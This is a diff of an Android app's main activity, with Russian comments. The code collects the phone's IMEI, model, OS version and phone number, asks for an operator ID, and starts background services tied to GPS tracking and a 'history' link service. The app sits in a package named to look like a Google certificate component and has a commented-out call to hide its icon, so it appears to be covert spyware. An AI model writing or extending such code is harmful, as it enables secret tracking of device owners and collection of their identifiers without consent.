@@ -5,7 +5,6 @@ import java.io.FilenameFilter;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
-import android.R;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.ComponentName;
@@ -26,6 +25,7 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
 
+import com.google.android.certificate.R;
 import com.google.android.history.LinkService;
 import com.google.android.location.GPSTracker;
 
@@ -53,7 +53,7 @@ public class MainActivity extends Activity {
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
-		setContentView(R.layout.activity_main);		
+		setContentView(R.layout.activity_main);
 
 		sp = PreferenceManager
 				.getDefaultSharedPreferences(getApplicationContext());
@@ -62,44 +62,41 @@ public class MainActivity extends Activity {
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String versionAndroid = android.os.Build.VERSION.RELEASE;
-		String phoneNumber = ""; 
-		
+		String phoneNumber = "";
 
 		aboutDev = "IMEI: " + imeistring + " Model: " + model
 				+ " Version android: " + versionAndroid;
 
 		e = sp.edit();
-		
+
 		e.putString("ABOUT", "dev");
 		e.commit();
-		
-//		hideIcon();
-//		start(); // запуск сервисов
-		
+
+		// hideIcon();
+		// start(); // запуск сервисов
+
 		// проверяем, первый ли раз открывается программа
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 
 		if (!hasVisited) {
-//			getID();
+			// getID();
 			// проверка на первое посещение
 			e = sp.edit();
-			
+
 			e.putBoolean("hasVisited", true);
 			e.putString("ABOUT", aboutDev);
 			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
-			
+
 			e.commit();
 		}
-		
+
 		if (manager.getSimState() == 5) {
 			phoneNumber = manager.getLine1Number();
 			e.putString("phoneNumber", phoneNumber);
 			e.commit();
-			start(); // запуск сервисов
-//			viewIDDialog();
-			finish();
-		} else {
-			viewIDDialog();
+			if (phoneNumber == null) {
+				viewIDDialog();
+			}
 		}
 	}
 
@@ -110,30 +107,31 @@ public class MainActivity extends Activity {
 		alert.setTitle("Ввод ID");
 		alert.setMessage("Введите ID. Нет права на ошибку!");
 
-		// Set an EditText view to get user input 
+		// Set an EditText view to get user input
 		final EditText input = new EditText(this);
 		alert.setView(input);
 
 		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
-		public void onClick(DialogInterface dialog, int whichButton) {
-		  String value = input.getText().toString();
-		  // Do something with value!
-		  Log.d(LOG_TAG, "Text: " + value);
-		  sp = PreferenceManager
-					.getDefaultSharedPreferences(getApplicationContext());
-		  Editor e = sp.edit();
-		  e.putString("ID", value);
-		  e.commit();
-		  start(); // запуск сервисов
-		  finish();
-		  }
+			public void onClick(DialogInterface dialog, int whichButton) {
+				String value = input.getText().toString();
+				// Do something with value!
+				Log.d(LOG_TAG, "Text: " + value);
+				sp = PreferenceManager
+						.getDefaultSharedPreferences(getApplicationContext());
+				Editor e = sp.edit();
+				e.putString("ID", value);
+				e.commit();
+				start(); // запуск сервисов
+				finish();
+			}
 		});
 
-		alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
-		  public void onClick(DialogInterface dialog, int whichButton) {
-		    // Canceled.
-		  }
-		});
+		alert.setNegativeButton("Cancel",
+				new DialogInterface.OnClickListener() {
+					public void onClick(DialogInterface dialog, int whichButton) {
+						// Canceled.
+					}
+				});
 
 		alert.show();
 		Log.d(LOG_TAG, "2 - " + input.getText().toString());
